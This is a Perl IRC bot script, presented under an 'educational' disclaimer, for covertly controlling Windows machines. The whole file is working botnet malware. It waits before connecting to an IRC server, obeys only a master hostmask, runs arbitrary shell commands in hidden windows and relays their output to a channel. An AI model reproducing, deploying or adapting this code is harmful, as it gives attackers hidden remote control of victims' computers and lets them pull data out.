################################################
#    - simple irc bot for the remote control of Windows based systems -      
#      by grid                                                                      
#
#    Disclaimer:    This file is intended for educational purpose ONLY.
#         The author can not be held responsible for anything that results
#         from the usage of this program.            
################################################

# Modules to use
use Win32::Job;
use IO::Socket;

# timeout before connection to let the host system connect to the internet
sleep 300;

# Variables
# ------------
# nickname generation: "prefix<randomnumber>"
my $prefix = 'prefix';
my $code = int(rand(100000));
my $nick = $prefix.$code;

# filename for the temporary output
my $outputfile = 'system122231.dat';

# irc server to connect to
my $server = 'irc.choose-one.org';
my $port = '6667';

# the channel the bot will idle in
my $channel = '#choose-one';

# username
my $login = 'imnotabot';

# hostmask of the bot-owner
my $master = 'i.love.obscure.hostmasks.org';

# Win32::Job to execute commands unseen
my $job = Win32::Job->new;

# variable to check if the bot already joined a channel
my $joined = 0;

# start of the connection process
# ----------------------------------------
# initialize socket
my $sock = new IO::Socket::INET(PeerAddr => $server, PeerPort => $port, Proto => 'tcp') or die("Can't connect!\n");

# login with nick and some arbitrary data
print $sock "NICK $nick\r\n";
print $sock "USER $login 8 * :n0 b0t\r\n";


# read connection and receive commands
while(my $input = <$sock>) {
   chop $input;
   
   # ping commands must be returned to keep connection alive and after the first ping a channel join is possible
   if($input =~ m/^PING(.*)$/i) {
      print $sock "PONG $1\r\n";
      if($joined == 0) {
         print $sock "JOIN $channel\r\n";
         $joined++;
      }
   }
   
   # "do" executes an IRC command
   elsif($input =~ m/$master\Q PRIVMSG \E.*\Q :do \E(.*)/i) {
      print $sock "$1";
   }
   
   # "kill" stops the bot
   elsif($input =~ m/$master\Q PRIVMSG \E.*\Q :kill\E(.*)/i) {
      last;
   }
   
   # "systemtell" executes a console command on the host system and returns its output to the channel
   elsif($input =~ m/$master\Q PRIVMSG \E.*\Q :systemtell \E(.*)/i) {
      $command = $1;
      chop $command;
      print $sock "PRIVMSG $channel :Gotcha! Now executing $command\r\n";
      open($fh, ">$outputfile");
      $job->spawn(undef, "$command", {
                           no_window => true,
                           stdout => $fh,
                           stderr => $fh
                           });
      $job->run(30);
      close($fh);
      open($fh, "$outputfile");
      while($output = <$fh>) {
         chop $output;
         sleep 2;
         print $sock "PRIVMSG $channel :$output\r\n";
      }
   }
   
   # "system" executes a console command without returning its output - useful for commands targeting many bots on a channel
   elsif($input =~ m/$master\Q PRIVMSG \E.*\Q :system \E(.*)/i) {
      $command = $1;
      chop $command;
      print $sock "PRIVMSG $channel :Now executing $command\r\n";
      open($fh, ">$outputfile");
      $job->spawn(undef, "$command", {
                           no_window => true,
                           stdout => $fh,
                           stderr => $fh
                           });
      $job->run(30);
      close($fh);
   }
}
close($sock);
# EOF 